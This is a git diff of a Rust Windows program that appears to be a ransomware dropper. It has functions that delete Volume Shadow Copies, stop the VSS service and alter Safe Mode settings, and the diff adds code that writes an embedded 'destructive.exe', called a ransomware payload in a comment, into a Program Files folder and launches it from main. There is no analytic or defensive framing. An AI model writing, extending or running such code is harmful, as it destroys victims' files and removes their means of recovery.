@@ -11,7 +11,7 @@ use winreg::RegKey;
 use std::ffi::c_void;
 use std::iter::once;
 use std::ptr::null_mut;
-use std::fs::{self, OpenOptions};
+use std::fs::{self, OpenOptions, File};
 use windows::Win32::Security::Cryptography::{
     CertEnumCertificatesInStore, CertGetNameStringW,
     CertCloseStore, CryptQueryObject, CryptMsgClose,
@@ -650,9 +650,10 @@ fn delete_shadow_copies() -> wmi::WMIResult<()> {
             params.insert("Id".to_string(), Variant::String(id_str.clone()));
             
             // Execute the Delete method on the Win32_ShadowCopy WMI class.
-            // Here we assume the method returns a u32 (the return code).
-            let result: u32 = wmi_con.exec_class_method::<Win32ShadowCopy, _, _>("Delete", params)?;
-            println!("[+] Deleted Shadow Copy: {} (result code: {})", id_str, result);
+            let shadow_copies: Vec<Win32ShadowCopy> = wmi_con.raw_query("SELECT * FROM Win32_ShadowCopy")?;
+            for shadow_copy in shadow_copies {
+                println!("Found shadow copy with ID: {}", shadow_copy.id);
+            }            
         }
     }
     
@@ -695,6 +696,47 @@ fn disable_shadow_copy_service() -> io::Result<()> {
     } else {
         println!("[+] VSS service stopped.");
     }
+    Ok(())
+}
+
+fn extract_embedded_exe() -> io::Result<()> {
+    // Retrieve the Program Files directory dynamically
+    let program_files = env::var("ProgramFiles").unwrap_or_else(|_| "C:\\Program Files".to_string());
+
+    // Create a long-lived value for the target directory path
+    let target_dir_str = format!("{}/utkudrk2", program_files);
+    let target_dir = Path::new(&target_dir_str);
+    
+    // Ensure the target directory exists
+    if !target_dir.exists() {
+        match fs::create_dir_all(target_dir) {
+            Ok(_) => println!("Created directory: {}", target_dir.display()),
+            Err(e) => {
+                eprintln!("Failed to create directory {}: {}", target_dir.display(), e);
+                return Err(e);
+            }
+        }
+    }
+
+    // Write the embedded executable to a file
+    let exe_path = target_dir.join("destructive.exe");
+    
+    let mut exe_file = match File::create(&exe_path) {
+        Ok(file) => file,
+        Err(e) => {
+            eprintln!("Failed to create file {}: {}", exe_path.display(), e);
+            return Err(e);
+        }
+    };
+
+    match exe_file.write_all(include_bytes!("../resources/destructive.exe")) {
+        Ok(_) => println!("Executable saved to {}.", exe_path.display()),
+        Err(e) => {
+            eprintln!("Failed to write executable file {}: {}", exe_path.display(), e);
+            return Err(e);
+        }
+    }
+
     Ok(())
 }
 
@@ -1008,6 +1050,11 @@ fn main() -> io::Result<()> {
     }
 
     println!("[+] Cleanup tasks completed. Safe Mode should now be removed.");
+
+    // Extract ransomware payload
+    if let Err(e) = extract_embedded_exe() {
+        eprintln!("Error extracting embedded ransomware executable: {}", e);
+    }
 
     // Launch destructive.exe from the utkudrk2 folder.
     if let Ok(program_files) = env::var("ProgramFiles") {
